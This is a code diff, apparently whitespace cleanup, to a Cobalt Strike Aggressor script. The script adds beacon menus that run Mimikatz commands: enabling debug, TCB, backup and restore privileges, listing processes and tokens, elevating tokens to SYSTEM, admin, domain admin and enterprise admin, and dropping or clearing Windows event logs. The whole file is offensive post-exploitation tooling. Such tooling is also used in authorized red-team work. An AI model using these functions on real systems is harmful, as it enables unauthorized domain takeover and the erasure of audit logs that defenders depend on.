@@ -32,7 +32,6 @@ local('$bid');
 
 sub debug{
 bmimikatz($1, "privilege::debug");
-
 }
 item "Driver Privilege"{
 local('$bid');
@@ -63,7 +62,6 @@ local ('$bid');
 
 
 item "TCB Privilege"{
-
 local ('$bid');
 
 				foreach $bid ($1){
@@ -75,14 +73,9 @@ local ('$bid');
 
 
 }
-
 sub tcb{
 bmimikatz($1, "privilege::tcb");
-
 }
-
-
-
 item "Backup Privilege"{
 local ('$bid');
 
@@ -93,21 +86,10 @@ local ('$bid');
 				}
 
 }
-
-
-
 sub backup{
-
 bmimikatz($1, "privilege::backup");
-
 }
-
-
-
 item "Restore Privilege"{
-
-
-
 local ('$bid');
 
 				foreach $bid ($1){
@@ -117,21 +99,10 @@ local ('$bid');
 				}
 
 }
-
-
-
 sub restore{
-
 bmimikatz($1, "privilege::restore");
-
 }
-
-
-
 item "System Environment Privilege"{
-
-
-
 local ('$bid');
 
 				foreach $bid ($1){
@@ -143,99 +114,32 @@ local ('$bid');
 
 
 }
-
-
-
 sub sysenv{
-
-
-
-
-
 bmimikatz($1, "privilege::sysenv");
-
-
-
-
-
 }
-
-
-
-
-
-
-
 ##########################################
-
 #########################################
-
 ###
-
 ###
-
 ### End Privilege Request Menu and Functions
-
 ###
-
 ###
-
 ###
-
 #########################################
-
 ##########################################
-
-
-
 } #This marks the end of the Privilege Request Menu
-
-
-
-
-
-
-
-
-
-
-
-
-
 ##########################################
-
 #########################################
-
 ###
-
 ###
-
 ### Begin Process Manipulation Menu and Functions
-
 ###
-
 ###
-
 ###
-
 #########################################
-
 ##########################################
-
-
-
 	menu "Process Manipulation" {
-
-	
-
-	
-
-
-
 item "List Processes"{
-
-
-
 local ('$bid');
 
 				foreach $bid ($1){
@@ -245,21 +149,8 @@ local ('$bid');
 				}
 
 }
-
-
-
 sub listprocesses{
-
-
-
-
-
 bmimikatz($1, "process::list");
-
-
-
-
-
 }
 
 
@@ -353,135 +244,18 @@ bmimikatz($1, "process::list");
 	
 
 } #This marks the end of the Process Manipulation menu
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ###################################
-
-
-
-
-
-
-
 ##  
-
-
-
-
-
-
-
 ##  Begin Token Elevation Menu
-
-
-
-
-
-
-
 ##
-
-
-
-
-
-
-
 ###################################
-
-
-
-
-
-
-
 menu "Token Enumeration"
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 {
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 #####################################
-
-
-
-
-
-
-
 ##  
-
-
-
-
-
-
-
 ##  List all Tokens
-
-
-
-
-
-
-
 ##
-
-
-
-
-
-
-
 #####################################
-
-
-
 
 
 
@@ -557,33 +331,18 @@ menu "Token Enumeration"
 			}
 
 ##############################
-
 ##  
-
 ##  Function - List Tokens
-
 ##
-
 ##############################
-
 sub tokenlist{
-
 bmimikatz($1, "token::list");
-
 }
-
 ##############################
-
 ##  
-
 ##  List Admin tokens
-
 ##
-
 ##############################
-
-
-
 
 
 
@@ -705,165 +464,19 @@ bmimikatz($1, "token::list");
 
 
 
-
-
-
 #############################################
-
-
-
-
-
-
-
 ##  
-
-
-
-
-
-
-
 ##  Create Listing of Admin token function
-
-
-
-
-
-
-
 ##
-
-
-
-
-
-
-
 #############################################
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 sub listadmintokens{
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 bmimikatz($1, "token::list /admin");
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ##############################
-
-
-
-
-
-
-
 ##  
-
-
-
-
-
-
-
 ##  List Domain Admin tokens
-
-
-
-
-
-
-
 ##
-
-
-
-
-
-
-
 ##############################
-
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -985,173 +598,19 @@ bmimikatz($1, "token::list /admin");
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 #################################################
-
-
-
-
-
-
-
 ##  
-
-
-
-
-
-
-
 ##  Create Listing of Domain Admin token function
-
-
-
-
-
-
-
 ##
-
-
-
-
-
-
-
 #################################################
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 sub listdatokens{
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 bmimikatz($1, "token::list /domainadmin");
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ##################################
-
-
-
-
-
-
-
 ##  
-
-
-
-
-
-
-
 ##  List Enterprise Admin tokens
-
-
-
-
-
-
-
 ##
-
-
-
-
-
-
-
 ##################################
-
-
-
 
 
 
@@ -1269,77 +728,11 @@ bmimikatz($1, "token::list /domainadmin");
 
 
 ########################################################
-
-
-
-
-
-
-
 ##  
-
-
-
-
-
-
-
 ##  Create Listing of Enterprise Admin token function
-
-
-
-
-
-
-
 ##
-
-
-
-
-
-
-
 ########################################################
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 sub listeatokens{
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 bmimikatz($1, "token::list /enterpriseadmin");
 
 
@@ -1377,101 +770,14 @@ bmimikatz($1, "token::list /enterpriseadmin");
 
 
 
-
-
-
 } #This Brace marks the end of the Token Enumeration Stuff
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 menu "Token Elevation"
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 {
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 #####################################
-
-
-
-
-
-
-
 ##  
-
-
-
-
-
-
-
 ##  Token Elevation to System
-
-
-
-
-
-
-
 ##
-
-
-
-
-
-
-
 #####################################
-
-
-
 
 
 
@@ -1593,164 +899,19 @@ menu "Token Elevation"
 
 
 
-
-
-
 ##############################
-
-
-
-
-
-
-
 ##  
-
-
-
-
-
-
-
 ##  Elevate to System Token Function
-
-
-
-
-
-
-
 ##
-
-
-
-
-
-
-
 ##############################
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 sub elevatesystem{
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 bmimikatz($1, "token::elevate /system");
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 #####################################
-
-
-
-
-
-
-
 ##  
-
-
-
-
-
-
-
 ##  Token Elevation to Admin
-
-
-
-
-
-
-
 ##
-
-
-
-
-
-
-
 #####################################
-
-
 
 
 
@@ -1873,173 +1034,19 @@ bmimikatz($1, "token::elevate /system");
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ##############################
-
-
-
-
-
-
-
-##  
-
-
-
-
-
-
-
+## 
 ##  Elevate to Admin Token Function
-
-
-
-
-
-
-
 ##
-
-
-
-
-
-
-
 ##############################
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 sub elevateadmin{
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 bmimikatz($1, "token::elevate /admin");
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 #####################################
-
-
-
-
-
-
-
 ##  
-
-
-
-
-
-
-
 ##  Token Elevation to Domain Admin
-
-
-
-
-
-
-
 ##
-
-
-
-
-
-
-
 #####################################
-
-
-
 
 
 
@@ -2161,157 +1168,19 @@ bmimikatz($1, "token::elevate /admin");
 
 
 
-
-
-
 ###########################################
-
-
-
-
-
-
-
 ##  
-
-
-
-
-
-
-
 ##  Elevate to Domain Admin Token Function
-
-
-
-
-
-
-
 ##
-
-
-
-
-
-
-
 ###########################################
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 sub elevateDA{
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 bmimikatz($1, "token::elevate /domainadmin");
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 #########################################
-
-
-
-
-
-
-
 ##  
-
-
-
-
-
-
-
 ##  Token Elevation to Enterprise Admin
-
-
-
-
-
-
-
 ##
-
-
-
-
-
-
-
 #########################################
-
-
-
 
 
 
@@ -2433,141 +1302,20 @@ bmimikatz($1, "token::elevate /domainadmin");
 
 
 
-
-
-
 ################################################
-
-
-
-
-
-
-
 ##  
-
-
-
-
-
-
-
 ##  Elevate to Enterprise Admin Token Function
-
-
-
-
-
-
-
 ##
-
-
-
-
-
-
-
 ################################################
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 sub elevateEA{
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 bmimikatz($1, "token::elevate /enterpriseadmin");
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 }
-
-
-
 			
-
-
-
-
-
-
-
 			
-
-
-
-
-
-
-
 ##############################################################################################
-
-
-
-
-
-
-
 ##  
-
-
-
-
-
-
-
 ##  Token Elevation to Custom User Function - This works now!! Thanks to Steve Borosh AKA rvrsh3ll
-
-
-
-
-
-
-
 ## The below function will be reused in order to facilitate moar Mimikatz
-
-
-
-
-
-
-
 ##############################################################################################
 
 
@@ -2625,45 +1373,9 @@ bmimikatz($1, "token::elevate /enterpriseadmin");
 
 
 
-
-
-
 } #This bracket represents the end of the Token Elevation Functions
-
-
-
-
-
-
-
-
-
-
-
 menu "Event Manipulation"
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 {
-
-
-
-
-
-
-
 item "Drop Future Events"{
 
 
@@ -2729,61 +1441,9 @@ item "Drop Future Events"{
 
 
 }
-
-
-
-
-
-
-
 sub eventdrop{
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 bmimikatz($1, "event::drop");
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 item "Clear All Events"{
 
 
@@ -2857,37 +1517,7 @@ item "Clear All Events"{
 
 
 sub eventclear{
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 bmimikatz($1, "event::clear");
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 }
 
 
